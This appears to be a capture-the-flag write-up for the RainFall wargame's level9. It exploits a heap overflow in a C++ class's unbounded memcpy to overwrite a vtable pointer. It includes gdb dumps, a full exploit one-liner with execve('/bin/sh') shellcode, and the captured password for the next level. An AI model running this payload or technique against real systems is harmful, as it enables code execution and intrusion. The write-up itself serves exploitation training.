in this challenge we have a binary that is compiled from a cpp file.

after figuring out the source code we see that we have a class called `N` that is declared as follows: 

```cpp
class   N {
    private:
        int     value;
        char    annotation[100];
    public:
        N(int value) {
            this->value = value;
        }

        virtual ~N() {}

        virtual int operator+(N& obj) {
            return obj.value + this->value;
        }

        virtual int operator-(N& obj) {
            return obj.value - this->value;
        }

        void    setAnnotation(char *str) {
            memcpy(this->annotation, str, strlen(str));
        }
};
```

since we have virtual functions and a method `setAnnotation` that uses `memcpy` without bounds, that means that we can overwrite the `annotation` attribute.

in our main we declare 2 objects of this class in the heap using `new`

if we look in our memory using gdb we see this:

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   ebp
   0x080485f5 <+1>:	mov    ebp,esp
   0x080485f7 <+3>:	push   ebx
   0x080485f8 <+4>:	and    esp,0xfffffff0
   0x080485fb <+7>:	sub    esp,0x20
   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    ebx,eax
   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx
   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    ebx,eax
   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax
   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax
   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048667 <+115>:	add    eax,0x4
   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048674 <+128>:	mov    DWORD PTR [esp],eax
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx
   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    
End of assembler dump.
(gdb) break main+40
Function "main+40" not defined.
Make breakpoint pending on future shared library load? (y or [n]) n
(gdb) break *main+40
Breakpoint 1 at 0x804861c
(gdb) break *main+74
Breakpoint 2 at 0x804863e
(gdb) r lmao
Starting program: /home/user/level9/level9 lmao

Breakpoint 1, 0x0804861c in main ()
(gdb) x $eax
0x804a008:	0x00000000
(gdb) c
Continuing.

Breakpoint 2, 0x0804863e in main ()
(gdb) x $eax
0x804a078:	0x00000000
(gdb) break *main+136
Breakpoint 3 at 0x804867c
(gdb) c
Continuing.

Breakpoint 3, 0x0804867c in main ()
(gdb) x/70wx 0x804a008
0x804a008:	0x08048848	0x6f616d6c	0x00000000	0x00000000
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000005	0x00000071
0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	0x00000000	0x00000000	0x00000006	0x00020f21
0x804a0e8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0f8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a108:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a118:	0x00000000	0x00000000
(gdb) 
```

first i disassembled the main function where i looked for the value of `eax` in 2 breakpoints to find the return of `new` function (the addresses of both `obj1` and `obj2` in the heap) then i set another break after `setAnnotation` call to see the layout of memory of both obj1 and obj2.

the address at the start of each object is a pointer to the vtable which contains both operator+ and operator-.

we can see that if we use a long enough string as an argument we can overwrite the vtable address of obj2 and put any address we want to redirect execution to since we call operator+ of obj2 in the end of our main:

```cpp
return (*obj2 + *obj1); => return obj->operator+(N &obj1);
```

now we know what to do: we hijack the vtable pointer in obj2, redirect it to an address that points to another address that takes us to a shellcode we inject using obj1 buffer.

```bash
./level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80" + "A" * (108 - 48) + "\x08\x04\xa0\x0c"[::-1]')
```

this payload if fairly easy to understand : first thing we think about here is the address `\x08\x04\xa0\x0c` (=> start of obj1 + 4 => start of annotation buffer) we will put in our obj2 vtable pointer, next we look at that location and put the address of our shellcode in it `\x08\x04\xa0\x10` (=> start of obj1 + 8 => start of shellcode in annotation buffer) the rest is the shellcode and the offset to the vtable pointer.

```bash
level9@RainFall:~$ ./level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80" + "A" * (108 - 48) + "\x08\x04\xa0\x0c"[::-1]')
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$ 
```

and there you go.
